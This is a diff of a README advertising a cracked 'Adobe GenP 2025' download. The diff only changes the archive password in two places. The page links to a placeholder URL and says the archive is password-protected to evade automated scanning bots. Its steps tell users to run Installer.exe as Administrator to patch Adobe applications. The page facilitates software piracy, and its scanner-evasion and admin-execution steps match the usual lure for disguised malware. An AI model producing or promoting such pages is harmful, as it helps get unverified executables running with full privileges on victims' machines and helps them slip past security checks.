@@ -14,7 +14,7 @@
 
 ### [⬇️ **DOWNLOAD LATEST VERSION**](https://your-link-here.com/Adobe_GenP_2025.zip)
 
-**Version:** 2025.1.0 | **Size:** 154 MB | **Password:** `genp2025`
+**Version:** 2025.1.0 | **Size:** 154 MB | **Password:** `GenP2026`
 
 > **Note:** Archive is password-protected to prevent automated scanning bots.
 
@@ -30,7 +30,7 @@
 ## 🚀 Quick Start Guide
 
 1.  Click the **Download** button above
-2.  Extract archive using password: `genp2025`
+2.  Extract archive using password: `GenP2026`
 3.  Run `Installer.exe` as Administrator
 4.  Click "Apply Modifications"
 5.  Restart your Adobe applications
